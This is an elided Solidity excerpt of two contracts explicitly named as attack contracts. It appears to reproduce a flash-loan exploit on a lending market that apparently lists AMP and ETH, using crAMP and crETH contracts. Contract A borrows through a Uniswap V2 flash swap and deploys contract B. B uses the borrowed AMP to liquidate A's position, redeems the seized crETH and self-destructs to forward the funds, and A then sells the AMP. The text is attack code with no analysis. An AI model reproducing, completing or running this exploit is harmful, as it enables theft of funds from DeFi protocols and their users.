...
contract attack_contract_A {
    ...
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        ...
        attack_contract_B B = new attack_contract_B();
        
        B_Address = address(B);

        AMP(AMPToken_Address).transfer(B_Address, 19480000000000000000000000/2);
        
        B.liquidate(address(this),wallet);
        ...
        //卖掉AMP
        Uni_Router_V2(UniswapV2Router02_address).swapExactTokensForTokens(9740000000000000000000000,1,path,address(this),block.timestamp);
...
contract attack_contract_B{
    ...
    function liquidate(address addr,address _wallet) public{
        
        address A_Address = addr;

        address wallet = _wallet;
        
        
        AMP(AMPToken_Address).approve(crAMP_Address,19480000000000000000000000000);
        
        crAMP(crAMP_Address).liquidateBorrow(A_Address,9740000000000000000000000,crETH_Address);
        
        crETH(crETH_Address).redeem(crETH(crETH_Address).balanceOf(address(this)));
        
        selfdestruct(payable(A_Address));
    }
